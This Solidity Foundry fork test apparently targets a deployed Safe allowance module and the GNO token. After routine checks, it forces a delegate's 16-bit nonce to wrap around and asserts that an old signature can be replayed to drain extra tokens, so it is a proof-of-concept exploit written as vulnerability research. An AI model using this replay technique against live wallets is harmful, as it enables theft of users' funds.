
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface IAllowanceModule {
    function addDelegate(address delegate) external;

    function setAllowance(
        address delegate,
        address token,
        uint96 allowanceAmount,
        uint16 resetTimeMin,
        uint32 resetBaseMin
    ) external;

    function getTokenAllowance(
        address safe,
        address delegate,
        address token
    ) external view returns (uint256[5] memory);

    function generateTransferHash(
        address safe,
        address token,
        address to,
        uint96 amount,
        address paymentToken,
        uint96 payment,
        uint16 nonce
    ) external view returns (bytes32);

    function executeAllowanceTransfer(
        address safe,
        address token,
        address payable to,
        uint96 amount,
        address paymentToken,
        uint96 payment,
        address delegate,
        bytes memory signature
    ) external;
}

interface ISafeModuleExec {
    function execTransactionFromModule(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation
    ) external returns (bool success);
}

contract AllowanceForkTest is Test {

    address constant SAFE =
        0xfF501B324DC6d78dC9F983f140B9211c3EdB4dc7;

    address constant MODULE =
        0xCFbFaC74C26F8647cBDb8c5caf80BB5b32E43134;

    address constant DELEGATE =
        0x80F59C1D46EFC1Bb18F0AaEc132b77266f00Be9a;

    address constant GNO =
        0x6810e776880C02933D47DB1b9fc05908e5386b96;

    address constant RECIPIENT = address(0xBEEF);

    uint256 constant TEST_PRIVATE_KEY = 0xA11CE;

    IAllowanceModule module = IAllowanceModule(MODULE);

    IERC20Minimal gno = IERC20Minimal(GNO);

    struct ReplayData {
        address delegate;
        uint16 nonce;
        bytes signature;
        uint256 safeBefore;
        uint256 recipientBefore;
    }

    // --------------------------------------------------
    // TEST 1: Read allowance state
    // --------------------------------------------------

    function testReadAllowanceState() public {

        uint256[5] memory allowance =
            module.getTokenAllowance(SAFE, DELEGATE, GNO);

        assertEq(allowance[0], 10 ether);
        assertEq(allowance[1], 0);
        assertEq(allowance[2], 43200);
        assertEq(allowance[4], 1);
    }

    // --------------------------------------------------
    // TEST 2: Safe module can transfer GNO
    // --------------------------------------------------

    function testSafeModuleCanTransferGno() public {

        uint256 safeBefore = gno.balanceOf(SAFE);
        uint256 recipientBefore = gno.balanceOf(RECIPIENT);

        bytes memory data = abi.encodeWithSignature(
            "transfer(address,uint256)",
            RECIPIENT,
            1 ether
        );

        vm.prank(MODULE);

        bool success =
            ISafeModuleExec(SAFE).execTransactionFromModule(
                GNO,
                0,
                data,
                0
            );

        assertTrue(success);

        assertEq(gno.balanceOf(SAFE), safeBefore - 1 ether);
        assertEq(gno.balanceOf(RECIPIENT), recipientBefore + 1 ether);
    }

    // --------------------------------------------------
    // TEST 3: Authorized delegate transfer
    // --------------------------------------------------

    function testAuthorizedGnoTransfer() public {

        uint256 safeBefore = gno.balanceOf(SAFE);
        uint256 recipientBefore = gno.balanceOf(RECIPIENT);

        vm.prank(DELEGATE);

        module.executeAllowanceTransfer(
            SAFE,
            GNO,
            payable(RECIPIENT),
            1 ether,
            address(0),
            0,
            DELEGATE,
            ""
        );

        assertEq(gno.balanceOf(SAFE), safeBefore - 1 ether);
        assertEq(gno.balanceOf(RECIPIENT), recipientBefore + 1 ether);
    }

    // --------------------------------------------------
    // TEST 4: Unauthorized caller cannot use empty signature
    // --------------------------------------------------

    function testUnauthorizedCallerCannotUseEmptySignature()
        public
    {
        address attacker = address(0xCAFE);

        uint256 safeBefore = gno.balanceOf(SAFE);

        vm.prank(attacker);
        vm.expectRevert();

        module.executeAllowanceTransfer(
            SAFE,
            GNO,
            payable(RECIPIENT),
            1 ether,
            address(0),
            0,
            DELEGATE,
            ""
        );

        assertEq(gno.balanceOf(SAFE), safeBefore);
    }

    // --------------------------------------------------
    // TEST 5: Replay same signature rejected
    // --------------------------------------------------

    function testReplayAttackSameSignatureRejected() public {

        ReplayData memory data;

        data.delegate = _prepareReplayDelegate();
        data.nonce = 1;

        data.signature = _createReplaySignature(
            data.delegate,
            data.nonce
        );

        data.safeBefore = gno.balanceOf(SAFE);
        data.recipientBefore = gno.balanceOf(RECIPIENT);

        _executeReplayTransfer(data.delegate, data.signature);

        assertEq(gno.balanceOf(SAFE), data.safeBefore - 1 ether);
        assertEq(
            gno.balanceOf(RECIPIENT),
            data.recipientBefore + 1 ether
        );

        uint256[5] memory allowanceAfterFirst =
            module.getTokenAllowance(SAFE, data.delegate, GNO);

        assertEq(allowanceAfterFirst[1], 1 ether);
        assertEq(allowanceAfterFirst[4], 2);

        vm.expectRevert();

        _executeReplayTransfer(data.delegate, data.signature);

        assertEq(gno.balanceOf(SAFE), data.safeBefore - 1 ether);
        assertEq(
            gno.balanceOf(RECIPIENT),
            data.recipientBefore + 1 ether
        );

        uint256[5] memory allowanceAfterReplay =
            module.getTokenAllowance(SAFE, data.delegate, GNO);

        assertEq(allowanceAfterReplay[1], 1 ether);
        assertEq(allowanceAfterReplay[4], 2);
    }

    // --------------------------------------------------
    // TEST 6: Nonce overflow
    // --------------------------------------------------

    function testNonceOverflow() public {

        address testDelegate = _prepareReplayDelegate();

        bytes32 tokenSlot = _allowanceStorageSlot(testDelegate);

        _setNonce(testDelegate, 65535);

        uint256[5] memory beforeAllowance =
            module.getTokenAllowance(SAFE, testDelegate, GNO);

        assertEq(beforeAllowance[4], 65535);

        bytes memory signature = _createReplaySignature(
            testDelegate,
            65535
        );

        uint256 safeBefore = gno.balanceOf(SAFE);
        uint256 recipientBefore = gno.balanceOf(RECIPIENT);

        _executeReplayTransfer(testDelegate, signature);

        uint256[5] memory afterAllowance =
            module.getTokenAllowance(SAFE, testDelegate, GNO);

        assertEq(afterAllowance[4], 0);

        assertEq(gno.balanceOf(SAFE), safeBefore - 1 ether);
        assertEq(
            gno.balanceOf(RECIPIENT),
            recipientBefore + 1 ether
        );

        assertEq(afterAllowance[1], 1 ether);

        // Ensure the calculated storage slot is the intended one.
        assertEq(
            uint256(vm.load(MODULE, tokenSlot)) >> 240,
            0
        );
    }

    // --------------------------------------------------
    // TEST 7: Old signature replay after nonce wraparound
    // --------------------------------------------------

    function testReplayAfterNonceWraparound() public {

        // Prepare delegate and allowance
        address testDelegate = _prepareReplayDelegate();

        // Create and save an old signature for nonce 0.
        // This signature is not used yet.
        bytes memory oldSignature = _createReplaySignature(
            testDelegate,
            0
        );

        // Move nonce to 65535 on the local fork.
        _setNonce(testDelegate, 65535);

        uint256[5] memory beforeAllowance =
            module.getTokenAllowance(SAFE, testDelegate, GNO);

        assertEq(beforeAllowance[4], 65535);
        assertEq(beforeAllowance[1], 0);

        uint256 safeBefore = gno.balanceOf(SAFE);
        uint256 recipientBefore = gno.balanceOf(RECIPIENT);

        // First transfer: valid signature for nonce 65535.
        bytes memory maxNonceSignature = _createReplaySignature(
            testDelegate,
            65535
        );

        _executeReplayTransfer(
            testDelegate,
            maxNonceSignature
        );

        // Verify nonce wrapped to zero.
        uint256[5] memory afterFirstTransfer =
            module.getTokenAllowance(SAFE, testDelegate, GNO);

        assertEq(afterFirstTransfer[4], 0);
        assertEq(afterFirstTransfer[1], 1 ether);

        assertEq(
            gno.balanceOf(SAFE),
            safeBefore - 1 ether
        );

        assertEq(
            gno.balanceOf(RECIPIENT),
            recipientBefore + 1 ether
        );

        // Second transfer: reuse the old signature for nonce 0.
        // If accepted, this demonstrates replay after wraparound.
        _executeReplayTransfer(
            testDelegate,
            oldSignature
        );

        // Verify the old signature was accepted.
        uint256[5] memory afterReplay =
            module.getTokenAllowance(SAFE, testDelegate, GNO);

        assertEq(
            afterReplay[4],
            1,
            "Nonce should be 1 after replay"
        );

        assertEq(
            afterReplay[1],
            2 ether,
            "Spent should be 2 GNO after replay"
        );

        assertEq(
            gno.balanceOf(SAFE),
            safeBefore - 2 ether,
            "Safe should have lost 2 GNO"
        );

        assertEq(
            gno.balanceOf(RECIPIENT),
            recipientBefore + 2 ether,
            "Recipient should have received 2 GNO"
        );
    }

    // --------------------------------------------------
    // HELPERS
    // --------------------------------------------------

    function _prepareReplayDelegate()
        internal
        returns (address testDelegate)
    {
        testDelegate = vm.addr(TEST_PRIVATE_KEY);

        vm.prank(SAFE);
        module.addDelegate(testDelegate);

        vm.prank(SAFE);
        module.setAllowance(
            testDelegate,
            GNO,
            10 ether,
            43200,
            0
        );
    }

    function _createReplaySignature(
        address testDelegate,
        uint16 nonce
    )
        internal
        view
        returns (bytes memory signature)
    {
        bytes32 transferHash = module.generateTransferHash(
            SAFE,
            GNO,
            RECIPIENT,
            1 ether,
            address(0),
            0,
            nonce
        );

        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(TEST_PRIVATE_KEY, transferHash);

        signature = abi.encodePacked(r, s, v);
    }

    function _executeReplayTransfer(
        address testDelegate,
        bytes memory signature
    )
        internal
    {
        vm.prank(address(0xCAFE));

        module.executeAllowanceTransfer(
            SAFE,
            GNO,
            payable(RECIPIENT),
            1 ether,
            address(0),
            0,
            testDelegate,
            signature
        );
    }

    // --------------------------------------------------
    // STORAGE HELPERS
    // --------------------------------------------------

    function _allowanceStorageSlot(
        address testDelegate
    )
        internal
        pure
        returns (bytes32)
    {
        // allowances is state variable at slot 0.
        bytes32 safeSlot = keccak256(
            abi.encode(SAFE, uint256(0))
        );

        bytes32 delegateSlot = keccak256(
            abi.encode(testDelegate, safeSlot)
        );

        return keccak256(
            abi.encode(GNO, delegateSlot)
        );
    }

    function _setNonce(
        address testDelegate,
        uint16 nonce
    )
        internal
    {
        bytes32 slot = _allowanceStorageSlot(testDelegate);

        uint256 packedAllowance = uint256(
            vm.load(MODULE, slot)
        );

        uint256 lower240BitsMask =
            (uint256(1) << 240) - 1;

        packedAllowance &= lower240BitsMask;

        packedAllowance |= uint256(nonce) << 240;

        vm.store(
            MODULE,
            slot,
            bytes32(packedAllowance)
        );
    }
}
